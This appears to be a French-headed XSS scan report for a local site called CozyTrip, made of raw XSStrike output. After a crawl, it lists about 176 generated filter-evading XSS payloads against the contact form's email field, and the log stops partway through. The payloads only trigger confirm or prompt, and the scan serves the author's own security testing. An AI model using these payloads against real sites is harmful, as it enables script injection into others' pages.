# Rapport de Test XSS - CozyTrip 
## Date: 17/01/2025  0:56:23,44 
 
### Test 1: Page Hébergements 

	XSStrike v3.1.5

 Crawling the target 
 Parsing hebergements                             ------------------------------------------------------------
 Vulnerable component: bootstrap v5.0.2 
 Component location: https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js 
 Total vulnerabilities: 0 
------------------------------------------------------------
 Parsing hebergement_27                            Parsing hebergement_38                            Parsing login                                     Parsing hebergement/categorie/Appartement         Parsing hebergement_26                            Parsing hebergement_32                            Parsing contact                                   Parsing hebergement_16                            Parsing hebergement_6                             Parsing                                           Parsing hebergement/categorie/Bord-de-mer         Parsing hebergement_22                            Parsing hebergement_21                            Parsing hebergement_39                            Parsing hebergement/categorie/Hotel               Parsing hebergement/categorie/Luxe                Parsing hebergement_8                             Parsing hebergement/categorie/Chambres-d-hotes    Parsing hebergement_35                            Parsing hebergement_41                            Parsing hebergement_30                            Parsing hebergement_37                            Parsing hebergement/categorie/Piscine             Parsing register                                  Parsing hebergement_29                            Parsing hebergement_45                            Parsing hebergement/categorie/Maison-de-campagne  Parsing hebergement_13                            Parsing hebergement_44                            Parsing hebergement_42                            Parsing mention                                   Parsing hebergement/categorie/Hanoks              Parsing hebergement_5                             Potentially vulnerable objects found at http://localhost:8000/register 
------------------------------------------------------------
6   *setTimeout*(recaptchaCallback_registration_form_captcha, 100000);
------------------------------------------------------------
 Parsing hebergement_19                            Parsing hebergement/categorie/Riads               Parsing hebergement_40                            Parsing hebergement_14                            Parsing hebergement/categorie/Trulli              Parsing hebergement_33                            Parsing hebergement_36                            Parsing hebergement/categorie/Villa               Parsing hebergement_15                            Parsing hebergement_4                             Parsing hebergement_43                            Parsing hebergement_18                            Parsing hebergement_31                            Parsing hebergement_34                            Parsing hebergement/categorie/Chalet              Progress: 10/49  Progress: 20/49  Progress: 30/49  Progress: 40/49  Progress: 49/49 
### Test 2: Formulaire de Contact 

	XSStrike v3.1.5

 Checking for DOM vulnerabilities 
 WAF Status: Offline 
 Testing parameter: contact[votre_email] 
 Reflections found: 2 
 Analysing reflections 
 Generating payloads 
 Payloads generated: 1536 
 Progress: 1/1536 ------------------------------------------------------------
 Payload: <a%09onpOinTeReNter+=+confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 2/1536 ------------------------------------------------------------
 Payload: <hTmL/+/onMoUSeOVER%0a=%0a(prompt)``// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 3/1536 ------------------------------------------------------------
 Payload: <deTaIls%0aONpoInTERentEr+=+(confirm)()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 4/1536 ------------------------------------------------------------
 Payload: <Html%0doNMOuseovEr+=+(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 5/1536  Progress: 6/1536  Progress: 7/1536 ------------------------------------------------------------
 Payload: <dETaIls%0aonpoiNteReNter%09=%09a=prompt,a()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 8/1536 ------------------------------------------------------------
 Payload: <DETails%0dONpoiNTEreNTEr%0a=%0aconfirm()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 9/1536 ------------------------------------------------------------
 Payload: <A%0aoNPoiNterEntER+=+confirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 10/1536 ------------------------------------------------------------
 Payload: <a%0aoNMOuSEOVer+=+confirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 11/1536 ------------------------------------------------------------
 Payload: <dEtaiLs%09OnPoINTeRenTER%09=%09(prompt)``// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 12/1536 ------------------------------------------------------------
 Payload: <a%09OnmOUsEover%09=%09a=prompt,a()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 13/1536 ------------------------------------------------------------
 Payload: <DEtAILs/+/onToGgLe%0a=%0a[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 14/1536 ------------------------------------------------------------
 Payload: <A%0dONPOINTErENter%0a=%0aa=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 15/1536 ------------------------------------------------------------
 Payload: <deTAilS%0dONpOiNTerEnTER%09=%09confirm()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 16/1536 ------------------------------------------------------------
 Payload: <A%0aOnPOInTERenTer%0a=%0aconfirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 17/1536 ------------------------------------------------------------
 Payload: <A%0doNmouseovEr+=+(confirm)()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 18/1536 ------------------------------------------------------------
 Payload: <DETaiLs%0donPoINteRentEr+=+(confirm)()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 19/1536 ------------------------------------------------------------
 Payload: <htmL%0dONPoiNTereNtEr+=+[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 20/1536 ------------------------------------------------------------
 Payload: <DetAILs%0donPOinteREnteR+=+confirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 21/1536 ------------------------------------------------------------
 Payload: <D3v%0dONPoinTerENtER+=+(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 22/1536 ------------------------------------------------------------
 Payload: <d3v/+/oNMousEoVeR%09=%09(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 23/1536 ------------------------------------------------------------
 Payload: <a/+/oNMOusEoVEr%0a=%0a(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 24/1536 ------------------------------------------------------------
 Payload: <d3v/+/oNpOiNtEReNTER%0d=%0d(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 25/1536 ------------------------------------------------------------
 Payload: <Html/+/OnmOUseOVeR%0d=%0dconfirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 26/1536 ------------------------------------------------------------
 Payload: <D3v%0aonmOuSeOVeR+=+a=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 27/1536 ------------------------------------------------------------
 Payload: <DEtailS%09ONpointERENter%0a=%0a(confirm)()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 28/1536 ------------------------------------------------------------
 Payload: <d3V%0doNMOusEoVEr+=+(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 29/1536 ------------------------------------------------------------
 Payload: <detailS%0aOnPOiNTeReNteR%09=%09(prompt)``%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 30/1536 ------------------------------------------------------------
 Payload: <a%0dONPoInTERenTer%09=%09confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 31/1536 ------------------------------------------------------------
 Payload: <dETaIlS%0dOnpOINTereNTeR%0d=%0d(prompt)``// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 32/1536 ------------------------------------------------------------
 Payload: <D3v/+/ONmouSEOveR%0d=%0d[8].find(confirm)//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 33/1536 ------------------------------------------------------------
 Payload: <hTMl%0aONmouSEoveR+=+(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 34/1536 ------------------------------------------------------------
 Payload: <A%0dONpOiNteRenTer+=+(confirm)()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 35/1536 ------------------------------------------------------------
 Payload: <deTAilS%0aOnpoiNtErentEr+=+confirm()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 36/1536 ------------------------------------------------------------
 Payload: <a%0aonpoInteREntEr%09=%09(confirm)()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 37/1536 ------------------------------------------------------------
 Payload: <Html%0dONpOINTERENtER%0d=%0d(confirm)()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 38/1536 ------------------------------------------------------------
 Payload: <A%09onpOiNtereNTEr+=+[8].find(confirm)//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 39/1536 ------------------------------------------------------------
 Payload: <d3V/+/oNPointEreNteR%09=%09(confirm)()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 40/1536  Progress: 41/1536 ------------------------------------------------------------
 Payload: <dEtAILs/+/ONpOIntEreNtER%09=%09(prompt)``%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 42/1536 ------------------------------------------------------------
 Payload: <D3V/+/oNpOInTErENtER%0d=%0d(prompt)``//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 43/1536 ------------------------------------------------------------
 Payload: <d3v%0aOnPOinteRentER+=+confirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 44/1536 ------------------------------------------------------------
 Payload: <DEtaIlS%0aONPOiNTErENTeR%09=%09(prompt)``// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 45/1536 ------------------------------------------------------------
 Payload: <D3V%0dONPOiNTErENTeR+=+(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 46/1536 ------------------------------------------------------------
 Payload: <A%09onPointERENtEr+=+(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 47/1536 ------------------------------------------------------------
 Payload: <Html%0dOnPOINtEReNter+=+confirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 48/1536 ------------------------------------------------------------
 Payload: <D3v%0aOnmouSeOVer%0d=%0d(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 49/1536 ------------------------------------------------------------
 Payload: <A%0donmouseoVEr+=+confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 50/1536 ------------------------------------------------------------
 Payload: <hTML%0donmOUseoVER%0d=%0da=prompt,a()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 51/1536 ------------------------------------------------------------
 Payload: <DeTails/+/ONPoiNTereNTEr%0a=%0a[8].find(confirm)// 
 Efficiency: 93 
 Confidence: 10 
 Progress: 52/1536 ------------------------------------------------------------
 Payload: <deTaILS%0donTOgglE%0d=%0d(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 53/1536 ------------------------------------------------------------
 Payload: <HtMl/+/oNMOUSEover%0a=%0a(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 54/1536 ------------------------------------------------------------
 Payload: <dEtAils%0dOnPoINTEREnteR%0d=%0d(confirm)()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 55/1536 ------------------------------------------------------------
 Payload: <hTMl/+/ONPoINterENtEr+=+(confirm)()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 56/1536 ------------------------------------------------------------
 Payload: <HtMl%09oNpoinTerenTEr%0a=%0a[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 57/1536 ------------------------------------------------------------
 Payload: <D3v%0aonPOINTEREnTEr%0a=%0aa=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 58/1536 ------------------------------------------------------------
 Payload: <d3V%0aonMoUsEovER%0a=%0aconfirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 59/1536 ------------------------------------------------------------
 Payload: <d3V%0dOnMouseOVEr%09=%09a=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 60/1536 ------------------------------------------------------------
 Payload: <HTml/+/onmOUSEovER%09=%09[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 61/1536 ------------------------------------------------------------
 Payload: <htML%0dOnpoINTerenTEr%0d=%0d[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 62/1536 ------------------------------------------------------------
 Payload: <DeTaILS/+/ontoggLE%0d=%0d(confirm)()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 63/1536 ------------------------------------------------------------
 Payload: <A%0dOnPoINTEReNTEr%0a=%0a(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 64/1536 ------------------------------------------------------------
 Payload: <D3v%09ONMouseoVeR%09=%09(confirm)()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 65/1536 ------------------------------------------------------------
 Payload: <DetaILs/+/oNtogGle+=+(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 66/1536 ------------------------------------------------------------
 Payload: <HtMl%0aOnPoInterENTer%0a=%0aconfirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 67/1536 ------------------------------------------------------------
 Payload: <A%09OnMouSeOVEr%0d=%0dconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 68/1536 ------------------------------------------------------------
 Payload: <a%0dONmOuSEOVEr+=+confirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 69/1536  Progress: 70/1536 ------------------------------------------------------------
 Payload: <hTML/+/onPoINtERenTER%0a=%0a(prompt)``// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 71/1536 ------------------------------------------------------------
 Payload: <D3V%0aoNpOINteRENTeR+=+confirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 72/1536 ------------------------------------------------------------
 Payload: <DeTAiLS%0dontoGGLE%0a=%0a(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 73/1536 ------------------------------------------------------------
 Payload: <HtMl%09onPoiNteRenteR+=+[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 74/1536 ------------------------------------------------------------
 Payload: <HTML/+/OnPOINTERENtEr+=+[8].find(confirm)%0dx// 
 Efficiency: 93 
 Confidence: 10 
 Progress: 75/1536 ------------------------------------------------------------
 Payload: <a%0aonmOUseovEr%0d=%0dconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 76/1536 ------------------------------------------------------------
 Payload: <detAIlS/+/OnPoInTERenTEr%0d=%0d(confirm)()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 77/1536  Progress: 78/1536 ------------------------------------------------------------
 Payload: <dETaILS%0aONpOinterENTEr%09=%09confirm()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 79/1536 ------------------------------------------------------------
 Payload: <html%0donmoUSEoVEr+=+[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 80/1536 ------------------------------------------------------------
 Payload: <DEtAils/+/oNtoGGle%09=%09(prompt)``// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 81/1536 ------------------------------------------------------------
 Payload: <DEtAiLS/+/oNPoIntEreNteR%0d=%0da=prompt,a()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 82/1536 ------------------------------------------------------------
 Payload: <htMl%0donPointeREnTEr%09=%09confirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 83/1536 ------------------------------------------------------------
 Payload: <deTAiLs/+/oNToGgLe%0a=%0aconfirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 84/1536 ------------------------------------------------------------
 Payload: <D3v/+/oNMOuSeOver%0d=%0d(confirm)()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 85/1536 ------------------------------------------------------------
 Payload: <html/+/oNPointeRENter+=+[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 86/1536  Progress: 87/1536 ------------------------------------------------------------
 Payload: <D3V%0donmousEOVeR%09=%09[8].find(confirm)//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 88/1536 ------------------------------------------------------------
 Payload: <d3V%0donPoInTErEntER%09=%09a=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 89/1536 ------------------------------------------------------------
 Payload: <Html%0aONmoUSEovER%0a=%0aa=prompt,a()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 90/1536 ------------------------------------------------------------
 Payload: <D3V%0aOnmousEoVER%0d=%0d[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 91/1536 ------------------------------------------------------------
 Payload: <D3V/+/oNmouSEOVER%09=%09confirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 92/1536 ------------------------------------------------------------
 Payload: <dETaILs%0dONpOINTeRENTEr%0d=%0da=prompt,a()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 93/1536 ------------------------------------------------------------
 Payload: <deTaiLS/+/onpointerEntER+=+confirm()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 94/1536 ------------------------------------------------------------
 Payload: <A%0aoNPoiNtErEntEr%0a=%0a(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 95/1536 ------------------------------------------------------------
 Payload: <DEtAIls/+/oNTOGglE+=+[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 96/1536 ------------------------------------------------------------
 Payload: <a/+/OnMOuseoVEr+=+a=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 97/1536 ------------------------------------------------------------
 Payload: <HtmL%09oNpOinterEntER%0d=%0dconfirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 98/1536  Progress: 99/1536 ------------------------------------------------------------
 Payload: <HtML%0aOnPOiNTErENTer%0d=%0d(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 100/1536 ------------------------------------------------------------
 Payload: <D3v%0doNPoinTerenter%09=%09(prompt)``//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 101/1536 ------------------------------------------------------------
 Payload: <HTML%0dOnpoiNteREnTer%0d=%0d(prompt)``// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 102/1536 ------------------------------------------------------------
 Payload: <d3V%0aONpOInTERENteR%09=%09[8].find(confirm)//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 103/1536 ------------------------------------------------------------
 Payload: <d3v%0aoNmoUseOvER%0a=%0aa=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 104/1536 ------------------------------------------------------------
 Payload: <a%0donpOiNTerEnter%0a=%0a(confirm)()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 105/1536 ------------------------------------------------------------
 Payload: <DetaILs%09onpOiNTERenteR+=+confirm()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 106/1536 ------------------------------------------------------------
 Payload: <DeTailS%0dOnToGglE%0a=%0aa=prompt,a()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 107/1536 ------------------------------------------------------------
 Payload: <A/+/onmOuSEoVer%09=%09confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 108/1536 ------------------------------------------------------------
 Payload: <D3V/+/onMOUseoVer+=+confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 109/1536 ------------------------------------------------------------
 Payload: <d3V%09oNmoUsEOveR%0a=%0aconfirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 110/1536 ------------------------------------------------------------
 Payload: <D3V/+/onmOUsEOVeR+=+confirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 111/1536 ------------------------------------------------------------
 Payload: <HtML/+/onmoUseOVER%09=%09[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 112/1536 ------------------------------------------------------------
 Payload: <A%0aoNmOuSeoVEr%0d=%0dconfirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 113/1536 ------------------------------------------------------------
 Payload: <a%0aONpOIntereNTeR+=+[8].find(confirm)//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 114/1536  Progress: 115/1536 ------------------------------------------------------------
 Payload: <detAILS/+/oNtOGGle%0a=%0a[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 116/1536  Progress: 117/1536 ------------------------------------------------------------
 Payload: <dEtAIlS%0donTogglE+=+(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 118/1536 ------------------------------------------------------------
 Payload: <d3V%0aOnPoiNterENteR%0a=%0aa=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 119/1536 ------------------------------------------------------------
 Payload: <DEtAILs/+/onPOINTERenteR%0d=%0dconfirm()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 120/1536 ------------------------------------------------------------
 Payload: <HtmL%0dONPOINTeRenTEr%09=%09a=prompt,a()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 121/1536 ------------------------------------------------------------
 Payload: <a%09OnMousEoVER%0a=%0a(confirm)()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 122/1536 ------------------------------------------------------------
 Payload: <d3V/+/ONmOusEoVEr+=+(confirm)()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 123/1536 ------------------------------------------------------------
 Payload: <a%09onPoINTEReNTER%09=%09confirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 124/1536 ------------------------------------------------------------
 Payload: <a%0dONPoiNTEREnTeR%09=%09a=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 125/1536 ------------------------------------------------------------
 Payload: <d3V%0dONPOIntEREnTEr+=+[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 126/1536 ------------------------------------------------------------
 Payload: <hTML/+/onmOUsEOvEr%0d=%0d(prompt)``// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 127/1536 ------------------------------------------------------------
 Payload: <a/+/oNPoINtEreNTeR+=+(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 128/1536 ------------------------------------------------------------
 Payload: <HTmL%09OnmOusEoveR%0d=%0d[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 129/1536 ------------------------------------------------------------
 Payload: <detAILS%0dontoGgLe%09=%09a=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 130/1536 ------------------------------------------------------------
 Payload: <HtML%09ONpOInTEReNTEr%0a=%0aa=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 131/1536 ------------------------------------------------------------
 Payload: <d3V/+/ONPoinTErEnTER%0a=%0aa=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 132/1536  Progress: 133/1536 ------------------------------------------------------------
 Payload: <A%09OnMouSeoVER+=+confirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 134/1536 ------------------------------------------------------------
 Payload: <A/+/OnmouseOvER+=+confirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 135/1536 ------------------------------------------------------------
 Payload: <D3V%09onPoinTeReNtEr%09=%09(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 136/1536  Progress: 137/1536 ------------------------------------------------------------
 Payload: <D3v%0doNmoUSeoVEr%0a=%0aconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 138/1536 ------------------------------------------------------------
 Payload: <Html/+/ONmOUSeOVER%0a=%0a[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 139/1536 ------------------------------------------------------------
 Payload: <d3v%0donmoUSEOVER%0d=%0dconfirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 140/1536  Progress: 141/1536 ------------------------------------------------------------
 Payload: <htmL%0aoNmoUsEoVeR%09=%09a=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 142/1536 ------------------------------------------------------------
 Payload: <hTmL%0aONpoINTerENTEr%0a=%0aconfirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 143/1536 ------------------------------------------------------------
 Payload: <D3V%0aoNPOInTeRENTeR%0a=%0aconfirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 144/1536 ------------------------------------------------------------
 Payload: <A/+/oNMOuSeOveR+=+[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 145/1536 ------------------------------------------------------------
 Payload: <HTML/+/oNpOINTEReNTEr%0d=%0da=prompt,a()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 146/1536 ------------------------------------------------------------
 Payload: <A/+/ONMOusEOVer%0a=%0aa=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 147/1536 ------------------------------------------------------------
 Payload: <hTmL%0aoNpOinteRentER%0a=%0a(prompt)``// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 148/1536 ------------------------------------------------------------
 Payload: <detaIlS%0doNTOgGle+=+a=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 149/1536 ------------------------------------------------------------
 Payload: <a/+/ONpoinTERentER%0d=%0da=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 150/1536  Progress: 151/1536 ------------------------------------------------------------
 Payload: <HTML%0dONpOInTERenTer%0d=%0dconfirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 152/1536 ------------------------------------------------------------
 Payload: <A/+/ONMOusEOVEr%0d=%0dconfirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 153/1536 ------------------------------------------------------------
 Payload: <A%0donpoinTEREnteR%0d=%0d[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 154/1536 ------------------------------------------------------------
 Payload: <hTmL%09ONmOusEovER%0a=%0a[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 155/1536  Progress: 156/1536 ------------------------------------------------------------
 Payload: <A%09oNPoinTeREnTER%09=%09a=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 157/1536 ------------------------------------------------------------
 Payload: <deTaILs%0donPOInTerENtER%09=%09a=prompt,a()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 158/1536 ------------------------------------------------------------
 Payload: <a/+/oNpOinTeRENTer%0a=%0a(confirm)()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 159/1536 ------------------------------------------------------------
 Payload: <detaILS/+/ONPoINtereNter%0a=%0aconfirm()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 160/1536 ------------------------------------------------------------
 Payload: <DeTaILS/+/ONtOGGle%09=%09confirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 161/1536 ------------------------------------------------------------
 Payload: <htmL/+/onMousEoVeR%09=%09(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 162/1536 ------------------------------------------------------------
 Payload: <a%09onPOiNtErenter+=+confirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 163/1536 ------------------------------------------------------------
 Payload: <A/+/onPoiNTeReNtER+=+confirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 164/1536 ------------------------------------------------------------
 Payload: <D3V%09onmouSeoVer%0d=%0dconfirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 165/1536 ------------------------------------------------------------
 Payload: <A/+/ONmOUSeOver%09=%09confirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 166/1536 ------------------------------------------------------------
 Payload: <D3v%0aONMOuseoVer+=+confirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 167/1536 ------------------------------------------------------------
 Payload: <d3V%0dOnPOInTERenter+=+confirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 168/1536 ------------------------------------------------------------
 Payload: <detaiLS%0donpoIntErenTer%09=%09confirm()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 169/1536 ------------------------------------------------------------
 Payload: <d3v%0dOnPoinTERENTer%0a=%0a(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 170/1536 ------------------------------------------------------------
 Payload: <A%0dOnmoUSeOvEr%09=%09(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 171/1536 ------------------------------------------------------------
 Payload: <d3V/+/oNmoUSeOveR%0a=%0a(confirm)()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 172/1536 ------------------------------------------------------------
 Payload: <d3v/+/OnmOuSEOveR%0d=%0da=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 173/1536 ------------------------------------------------------------
 Payload: <A%0dONmOusEoVer%09=%09confirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 174/1536 ------------------------------------------------------------
 Payload: <A%0dOnMOuseoVER%0a=%0a(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 175/1536 ------------------------------------------------------------
 Payload: <a%0doNMouSEoveR%09=%09a=prompt,a()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 176/1536 ------------------------------------------------------------
 Payload: <A%0aOnPoINtereNter%0d=%0d(confirm)()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
